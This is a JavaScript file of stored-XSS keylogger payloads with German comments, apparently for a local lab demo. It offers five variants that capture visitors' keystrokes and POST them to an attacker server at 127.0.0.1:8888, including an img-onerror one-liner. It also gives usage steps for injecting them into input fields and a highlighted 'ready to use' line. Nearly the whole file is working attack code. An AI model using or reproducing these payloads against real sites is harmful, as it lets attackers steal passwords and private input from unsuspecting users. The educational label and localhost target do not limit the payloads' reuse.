// KEYLOGGER PAYLOAD - NUR FÜR BILDUNGSZWECKE
// Diesen Code in ein verwundbares Input-Feld einfügen (z.B. Bio, Post, Kommentar)

// ⚠️ WICHTIG: Attacker-Server muss auf Port 8888 laufen!
// Starten mit: python attacker_server.py

// Variante 1: Einfacher Keylogger mit Batch-Sending
// <script>
// let keys = '';
// document.addEventListener('keypress', function(e) {
//     keys += e.key;
//     if (keys.length > 10) {
//         fetch('http://127.0.0.1:8888/log_keys', {
//             method: 'POST',
//             headers: {'Content-Type': 'application/x-www-form-urlencoded'},
//             body: 'keys=' + encodeURIComponent(keys)
//         });
//         keys = '';
//     }
// });
// </script>

// Variante 2: Aggressiver Keylogger - sendet jeden Tastendruck sofort
// <script>
// document.addEventListener('keypress', function(e) {
//     fetch('http://127.0.0.1:8888/log_keys', {
//         method: 'POST',
//         headers: {'Content-Type': 'application/x-www-form-urlencoded'},
//         body: 'keys=' + encodeURIComponent(e.key)
//     });
// });
// </script>

// Variante 3: Erweiterter Keylogger mit Zeit-Intervall (sendet alle 3 Sekunden) ⭐ EMPFOHLEN
// <script>
// let buffer = '';
// document.addEventListener('keypress', function(e) {
//     buffer += e.key;
// });
// setInterval(function() {
//     if (buffer.length > 0) {
//         fetch('http://127.0.0.1:8888/log_keys', {
//             method: 'POST',
//             headers: {'Content-Type': 'application/x-www-form-urlencoded'},
//             body: 'keys=' + encodeURIComponent(buffer)
//         });
//         buffer = '';
//     }
// }, 3000);
// </script>

// Variante 4: Keylogger mit keydown Event (erfasst auch Spezialstasten)
// <script>
// let log = '';
// document.addEventListener('keydown', function(e) {
//     let key = e.key;
//     if (key === 'Enter') key = '[ENTER]';
//     else if (key === 'Backspace') key = '[BS]';
//     else if (key === ' ') key = '[SPACE]';
//     else if (key.length > 1) key = '[' + key + ']';
//     log += key;
//     if (log.length > 15) {
//         fetch('http://127.0.0.1:8888/log_keys', {
//             method: 'POST',
//             headers: {'Content-Type': 'application/x-www-form-urlencoded'},
//             body: 'keys=' + encodeURIComponent(log)
//         });
//         log = '';
//     }
// });
// </script>

// Variante 5: Kompakter One-Liner mit Image-Tag Fallback
// <img src=x onerror="let k='';document.onkeypress=e=>{k+=e.key;if(k.length>10){fetch('http://127.0.0.1:8888/log_keys',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'keys='+k});k=''}}">

// USAGE INSTRUCTIONS:
// 1. Starte den Attacker-Server: python attacker_server.py (läuft auf Port 8888)
// 2. Starte die verwundbare App: python app.py (läuft auf Port 5001)
// 3. Kopiere eine der Varianten oben (ohne die führenden //)
// 4. Füge sie in ein verwundbares Eingabefeld ein
// 5. Wenn ein User tippt, werden die Tastenanschläge an Port 8888 gesendet
// 6. Überprüfe die Konsole des Attacker-Servers oder keylog.txt

// EMPFEHLUNG FÜR DEMO:
// Variante 3 (Zeit-Intervall) ist am realistischsten, da sie nicht zu viele Requests erzeugt
// und dennoch alle Eingaben erfasst.

// BEISPIEL - READY TO USE:
// Kopiere diese Zeile für einen funktionierenden Keylogger:
// <script>let buffer='';document.addEventListener('keypress',function(e){buffer+=e.key;});setInterval(function(){if(buffer.length>0){fetch('http://127.0.0.1:8888/log_keys',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'keys='+encodeURIComponent(buffer)});buffer='';}},3000);</script>
